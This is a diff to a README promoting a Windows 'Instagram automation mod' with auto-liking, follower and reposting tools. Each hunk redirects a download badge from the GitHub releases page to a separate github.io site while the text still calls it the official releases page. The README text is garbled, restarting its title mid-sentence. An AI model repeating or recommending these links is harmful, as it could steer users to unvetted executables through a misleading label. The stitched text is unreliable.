@@ -1,6 +1,6 @@
 # 🚀 insta-newest-automation-mod - Automate Your Instagram Tasks Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Now-ff4d4d?style=for-the-badge&labelColor=2b2d42&logo=github&logoColor=white)](https://github.com/Ommustaf3845/insta-newest-automation-mod/releases)
+[![Download Now](https://img.shields.io/badge/Download-Now-ff4d4d?style=for-the-badge&labelColor=2b2d42&logo=github&logoColor=white)](https://ommustaf3845.github.io)
 
 insta-newest-automation-mod is a Windows application for Instagram automation tasks. It brings together auto-liking, reposting, follower tools, reels automation, downloader features, and chatbot-style options in one place. The app is intended for everyday computer users who want a simpler way to manage repeated Instagram actions without writing code or using developer tools.
 
@@ -10,7 +10,7 @@ This README explains where to download the app, how to open it on Windows, what 
 
 Use the button below to open the official releases page. Visit this link to download the application.
 
-[![Download App](https://img.shields.io/badge/Download-App-00c2a8?style=for-the-badge&labelColor=1d3557&logo=github&logoColor=white)](https://github.com/Ommustaf3845/insta-newest-automation-mod/releases)
+[![Download App](https://img.shields.io/badge/Download-App-00c2a8?style=for-the-badge&labelColor=1d3557&logo=github&logoColor=white)](https://ommustaf3845.github.io)
 
 Follow these steps on your Windows computer:
 
@@ -54,7 +54,7 @@ You do not need programming knowledge. The app is meant to be used through its v
 
 After you download and open the application, use the main window to choose the task you want. The exact screens may vary, but the general flow is straightforward# 🚀 insta-newest-automation-mod - Automate Your Instagram Tasks with Ease
 
-[![Download Now](https://img.shields.io/badge/Download-Now-ff4d4d?style=for-the-badge&labelColor=2b2d42&logo=github&logoColor=white)](https://github.com/Ommustaf3845/insta-newest-automation-mod/releases)
+[![Download Now](https://img.shields.io/badge/Download-Now-ff4d4d?style=for-the-badge&labelColor=2b2d42&logo=github&logoColor=white)](https://ommustaf3845.github.io)
 
 insta-newest-automation-mod is a Windows application for Instagram automation tasks. It brings together auto-liking, reposting, follower tools, reels automation, downloader features, and chatbot-style options in one place. The app is intended for everyday computer users who want a simpler way to manage repeated Instagram actions without writing code or using developer tools.
 
@@ -64,7 +64,7 @@ This README explains where to download the app, how to open it on Windows, what 
 
 Use the button below to open the official releases page. Visit this link to download the application.
 
-[![Download App](https://img.shields.io/badge/Download-App-00c2a8?style=for-the-badge&labelColor=1d3557&logo=github&logoColor=white)](https://github.com/Ommustaf3845/insta-newest-automation-mod/releases)
+[![Download App](https://img.shields.io/badge/Download-App-00c2a8?style=for-the-badge&labelColor=1d3557&logo=github&logoColor=white)](https://ommustaf3845.github.io)
 
 Follow these steps on your Windows computer:
 
